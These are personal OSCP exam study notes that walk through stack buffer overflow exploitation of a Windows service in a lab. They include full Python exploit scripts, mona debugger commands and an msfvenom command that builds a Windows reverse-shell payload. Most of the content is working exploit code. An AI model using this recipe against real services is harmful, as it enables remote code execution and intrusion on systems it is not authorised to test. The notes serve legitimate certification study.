Stack-Based Buffer OverFlow:(OSCP Only)
===========================
Note:
	We will be provided with a Test Windows box having:
		vuln.exe
		immunity + mona.py
		poc.py:
			Script provided in exam along with length of "A"s to crash the application
			Example:
				#!/usr/bin/python
				import socket
				try:
				  print "\nSending evil buffer..."
				  buffer = "A" * 0xA00
				  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
				  s.connect(("192.168.176.227", 7001))
				  s.send(buffer)
				  s.close()
				  print "\nDone!"
				except:
				  print "\nCould not connect!"
			We will provided with a hex value, in above case, it is "0xA00" => 2560
			we will call 
		Note:		
			This box has no internet access.
	Fuzzing is not required for the OSCP exam.
7 Steps to BOF:(Stratergy: Put address for "JMP/CALL ESP" in EIP -> Store the SC in ESP -> Execute!)
	Note:
		All the scripts are in python3 and saved seperately.
	Note:
		Sometimes, registers window goes blank during fuzzing, so press "ALT + C"
	0. Opening vulnapp:
		1. Connect to Test System:
			xfreerdp +clipboard /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
			rdesktop -g 85% -r disk:share=/var/www -r clipboard:CLIPBOARD -u username -p password 10.10.10.10
				We will be able to copy and paste
		2. Open vuln.exe in Immunity Debugger:
			a. File -> Attach => attach a process:
				Using TCPView.exe to find PID:
					Sort by local port -> Find the port which vulnerable service is listening on -> copy PID
				Select the PID
			b. File -> Open -> Open a program(.exe)
				We can also add input this way
		3. Adjust Apperance:
			Right-click -> Apperance -> Font(all) -> OEM fixed font
			Right-click -> Apperance -> Colors(all) -> Scheme 5
				Reason => yellow and red are caught in the eye early
			Options -> Apperance -> fonts -> Change -> (Consolas, Blod, 9) -> OK
		4. Disable "Terminating Process" warning:
			Options -> Debugging Options -> Security -> uncheck "warn when terminating active processes"
			This will save some time whenever i will restart the process
		D. Press F9 => Run the prog
		E. In Deubugger's cli, type:
			!mona config -set workingfolder c:\mona\<binary_name>
			After doing this, we will need to go back to "CPU Window" => Windows -> CPU Window
		F. Enumerate the vulnapp:
			kali> nc -nv <ip> <port> => See what options are there
	1. Analysing poc.py:
		This will give us:
			1. <buffer_string>
			2. <crash_length>
	2. Finding the Offset:(Offset => exact number of bytes to control the EIP) => gives "<offset_length>"
		msf-pattern_create -l <crash_length> => This will give "<pattern_create>" string
		./Offset.py:
			#!/usr/bin/env python3
			import socket

			ip = "MACHINE_IP"
			port = MACHINE_PORT

			prefix = "<buffer_string>" #netcat data

			offset = 0
			overflow = "A" * offset
			retn = ""
			padding = ""
			payload = "<pattern_create>"
			postfix = ""

			buffer = prefix + overflow + retn + padding + payload + postfix

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			try:
			  s.connect((ip, port))
			  print("Sending evil buffer...")
			  s.send(bytes(buffer + "\r\n", "latin-1"))
			  print("Done!")
			except:
			  print("Could not connect.")
		Immunity CLI -> !mona findmsp -distance <crash_length> => gives "<offset_length>"
			(better Alternative of msf-pattern_offset -l 800 -q <value_of_EIP_Register>)
=================Note: Step 3 and 4 are NOT useless for OSCP=====================================
	3. Controlling the EIP:(We basically do it to check if our earlier 2 steps were correct or not)
		Note:
			Controlling the EIP is the 1st goal of an attacker to execute BOF. We need to know the buffer size to control the EIP
		./Eip_Control.py:
			#!/usr/bin/env python3
			import socket

			ip = "MACHINE_IP"
			port = MACHINE_PORT

			prefix = "<buffer_string>" #netcat data
			offset = <offset_length>
			overflow = "A" * offset
			retn = "BBBB"
			padding = ""
			payload = "C" * (<crash_length> - <offset_length> - 4)
			postfix = ""

			buffer = prefix + overflow + retn + padding + payload + postfix

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			try:
			  s.connect((ip, port))
			  print("Sending evil buffer...")
			  s.send(bytes(buffer + "\r\n", "latin-1"))
			  print("Done!")
			except:
			  print("Could not connect.")
		Look into register window:
			EIP should show 42(B)
			ESP should show ASCII "CC--"
			STACK should show 43(C)
	4. Locating Space for our shellcode:
		First Execute Loc.py:
			./Loc.py:(A normal reverse shell payload requires around 410 bytes.(Maximum UpperBound => 600 bytes))
				#!/usr/bin/env python3
				import socket

				ip = "MACHINE_IP"
				port = MACHINE_PORT

				prefix = "<buffer_string>" # netcat data
				offset = <offset_length>
				overflow = "A" * offset
				retn = "BBBB"
				padding = ""
				payload = "C" * (<crash_length> - <offset_length> - 4)
				postfix = "D" * 600

				buffer = prefix + overflow + retn + padding + payload + postfix

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

				try:
				  s.connect((ip, port))
				  print("Sending evil buffer...")
				  s.send(bytes(buffer + "\r\n", "latin-1"))
				  print("Done!")
				except:
				  print("Could not connect.")
			Look into stack to see, how many D's we have:
				Google => Hex Difference => Address of 1st byte - Address of last byte
				If the difference is less than 400:
					Read First Stage BOF sheet
=================================================================================================
	5. Finding Bad Characters:
		Common BadChars:
			0x00 => null
		./BadChars.py:
			#!/usr/bin/env python3
			import socket

			ip = "MACHINE_IP"
			port = MACHINE_PORT

			prefix = "<buffer_string>" # netcat data
			offset = <offset_length>
			overflow = "A" * offset
			retn = "BBBB"
			padding = ""
			payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
			postfix = ""

			buffer = prefix + overflow + retn + padding + payload + postfix

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			try:
			  s.connect((ip, port))
			  print("Sending evil buffer...")
			  s.send(bytes(buffer + "\r\n", "latin-1"))
			  print("Done!")
			except:
			  print("Could not connect.")
		Lengthy Way:
			Right-click on "ESP" -> follow in Dump:
				Look at the dump and see where is the irregularity at(ex: 00). Notice the index of that irregularity and remove badchar of that index and run fuzzer.py again
		Smart Way:
			ALERT:
				This showed false positives in vulnapp1
			In Immunity Debugger CLI:
				!mona bytearray -b "\x00"
				!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address> => this will gives us a list of bad chars.
					Lets say badchars are 00 07 08 2e 2f
					Run badchars.py without 07 and then:(Since, 00 was never a part of our payload)
						run BadChars.py without the \x07
						!mona bytearray -b "\x00\x07"
						!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address> => See list of bad chars again
						Repeat the above steps, till we get "!!! Hooray, normal shellcode unmodified !!!" in mona log
				Note:
					ESP_address changes everytime we load the app
	6. Redirecting the execution flow:(Gives "<return_address>")
		Using JMP ESP statement:
			Smart Way:
				1. We have 2 options:
					A. !mona jmp -r esp -cpb "<bad_chars>" => gives "<address_from_jmpesp_command>" 
					B. !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "<bad_chars>"
				2. Cross-Check the address:
					Go to immunity -> Assembly Instructions Window > Right-Click -> Go-To -> expression -> enter "<address_from_jmpesp_command>" we found
						See if "<address_from_jmpesp_command>" actually points to JMP ESP
				3. "<return_address>":
					Convert "<address_from_jmpesp_command>" to Little Endian Format:
						We basically convert HEX in "BIG ENDIAN" format to "LITTLE ENDIAN" format HEX
						Example => 0x625011af becomes \xaf\x11\x50\x62
						Just to make no HUMAN-ERROR, use online converter:
							http://www.save-editor.com/tools/wse_hex.html => BIG ENDIAN to LITTLE ENDIAN
		Using CALL ESP statement:
			Note:
				We can Try "CALL ESP" if assembly instruction for "JMP ESP" do not exist in any DLL.
	7. Exploiting BOF:
		Generate ShellCode:(This will give us <ShellCode>)
			msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '<badchars>' EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -i 3
				This will give us <ShellCode>
			Explanation:
				-v => This flag is used to set name of variable which will store shellcode
				-i 3 => via Sources
				EXITFUNC=thread:
					Default exit method of msfvenom SC is "ExitProcessAPI". This exit method shutdowns whole process when the reverse shell is terminated, effectively causing it to crash.
					If the program we are exploiting is a threaded application, we can try to avoid crashing the service completely by using the "ExitThreadAPI", which will only terminate the affected thread of the program. This will allow us to repeatedly exploit the service and exit the shell without crashing the service.
		./exploit.py:
			#!/usr/bin/env python3
			import socket

			ip = "MACHINE_IP"
			port = MACHINE_PORT

			prefix = "<buffer_string>" # netcat data
			offset = <offset_length>
			overflow = "A" * offset
			retn = "<return_address>"
			padding = "\x90" * 16 #nops
			payload = ("<ShellCode>")
			postfix = ""

			buffer = prefix + overflow + retn + padding + payload + postfix

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			try:
			  s.connect((ip, port))
			  print("Sending evil buffer...")
			  s.send(bytes(buffer + "\r\n", "latin-1"))
			  print("Done!")
			except:
			  print("Could not connect.")
		Note:
			How many NOPs to use:
				20
	Note:
		If the binary we are exploiting, is attached to a service:
			sc stop SLmail
			sc start SLmail
			vs	
			net start slmail				
BOF NOT WORKING, what to do:
	Things that tend to trip people up:
		1. Bad characters:
			In MANUAL WAY, just because it PRINTS all the way to \xFF doesn't mean there isn't a badchar in there. If it *isn't* printing a character but continues to print the rest of them, that is still a bad character and must be removed. I wasted about 5-10 minutes on my BOF during attempt #1 not checking this because it printed to \xFF.
		2. Ensure your MSFVenom command is 100% accurate with LHOST, LPORT, badchar, and payload.
		2. Encoder:
			I don't think it'll be necessary to use any other encoder than shigata_ga_nai. If you find yourself going down this path, it's likely a rabbit-hole IMO.
		3. Little endian form:
			Use online converter to avoid "HUMAN ERROR"
		4. JMP ESP Address:
			Make sure the memory address that contains the jump code doesnâ€™t have any bad characters.
			No memory protections
		5. Triple check bad characters. I feel like thatâ€™s where 80% of people will make a mistake. Then check again. And donâ€™t assume something is a bad character too. Check them all. Manually. Carefully
Tools Used:
	msf-nasm_shell:
		nasm> <Assembly Instruction> => gives opcode for the specified Assembly Instruction
	Immunity Debugger:(Run as Administrator)
		Better Appearance:
			Right-click -> Apperacne -> Font(all) -> OEM fixed font
			Go to Options >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK
		Shortcuts:
			File -> Attach => attach a process
				Using TCPView.exe to find PID:
					Sort by local port -> Find the port which vulnerable service is listening on -> copy PID
				Select the PID
			File -> Open => Open a program(.exe)
			F9 => Run prog
			Ctrl + F9 => Run till Return
			F2 => Add/Remove a breakpoint
			Ctrl + F2 => restart the prog
			Alt + F2 => close the prog
			Alt + C => Sometimes, Register window goes blank, to bring it back we use this command
			F7 => step into
			F8 => step over
			Ctrl + G => Go-To the mentioned Address (Right-Click -> Go-To -> expression -> enter address)
			To go back to a window:
				Windows -> <select Window>
	mona:
		!mona config -set workingfolder c:\mona\%p
			This sets up folder for mona to write the log file
			%p variable will be replaced with the process name currently being debugged.
			Note:
				c:\abcd shall be a valid directory
		offset:
			!mona pc 3333 => same as msf-pattern_create -l 3333
				It will generate the following output in the mona directory:
					ASCII => pattern in ASCII
					HEX => pattern in HEX
			!mona pattern_create 3333 => same as above
			!mona patter_offset vaule_at_EIP => to find offset
		BadChars:
			!mona bytearray
				This will create bytearray.txt and bytearray.bin having badchar array containing hexbytes from \x00 to \xff
				Copy badchars from bytearray.txt
			!mona bytearray -b \x00
				This will create bytearray.txt and bytearray.bin having badchar array containing hexbytes except \x00
				Copy badchars from bytearray.txt
			!mona compare -a <address> -f c:\mona\bytearray.bin
			!mona compare -a esp -f c:\mona\bytearray.bin
				Lists the BadChars by comparison
		JMP ESP:
			!mona jmp -r esp -cpb "\x00\x01" => Find jmp esp dll which dont have badchars
			!mona modules => show all modules
			!mona find -s "\xff\xe4" -m "<module_name>" => Finds modules which have JMP ESP inst in them
		Flags:
			-cpb => allows you to specify bad characters for other functions
			-a => address
			-b => to exclude bytes from array
			-r => register
			-s => string
			-m => module